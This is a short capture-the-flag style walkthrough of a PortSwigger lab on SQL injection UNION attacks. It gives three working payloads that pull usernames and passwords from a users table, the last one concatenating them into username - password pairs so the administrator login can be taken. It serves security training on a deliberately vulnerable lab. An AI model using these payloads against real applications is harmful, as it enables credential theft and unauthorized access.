# Lab-10: [SQL injection UNION attack, retrieving multiple values in a single column](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables. 

The database contains a different table called users, with columns called username and password. 

**Aim :-** To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. 


## Solution
- Use the following payload to retrive all the **usernames** from the users table
    ``` ' UNION SELECT null,username FROM users -- ```

- Use the following payload to retrive all the **passwords** from the users table
    ``` ' UNION SELECT null,password FROM users -- ```

- To understand which password is belonged to the administrator use the following  payload
    ``` ' UNION SELECT null,username || ' - ' || password FROM users -- ```
    - ``` || ``` is used for string concatenation so the query will return the out put like ``` username - password ```